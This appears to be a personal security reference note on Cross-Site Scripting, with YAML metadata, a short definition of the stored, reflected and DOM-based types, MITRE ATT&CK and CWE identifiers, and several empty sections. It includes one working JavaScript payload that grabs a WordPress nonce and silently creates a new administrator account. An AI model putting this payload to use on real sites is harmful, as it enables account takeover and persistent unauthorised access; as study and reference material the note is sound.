---
category: technique
subjects:
  - cybersec
full_form: Cross-Site Scripting
acronym: XSS
cwe:
  - 707
  - 74
  - 79
vector: client-side
privileges: unauthenticated
target: browser engine
platform:
  - windows
  - linux
  - macos
  - android
  - ios
intent:
  - data exfiltration
  - code injection
  - content injection
  - persistence
---
## Definition
Cross-Site Scripting is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.
- **Stored (Persistent):** the exploit payload is stored in a database or otherwise cached by a server, so every visitor retrieves that payload and executes it
- **Reflected:** the payload is included in a crafted request or link, only attacking the client that submitted this request
- **DOM-based:** the payload never reach the server, being entirely received and executed by the client

### Notes
- executed in the client-side
- persistent is stored in server-side
- both persistent and reflected originates from a servers input that was not sanitized, but DOM is purely client-side
- web
- can be used to steal cookies, tokens and other session information, besides sensitive data

```js
let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
```

T1189
T1190
TA0006
TA0003
TA0009
TA0004
M1021
M1050
M1048

## Mitigation

## Discovery

## Execution

## Evasion

## Relevant Reading
- []()

## External Reference
[attack.mitre.org](https://attack.mitre.org/techniques/)
[Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)
[EDB-ID XXXXXX](https://www.exploit-db.com/)
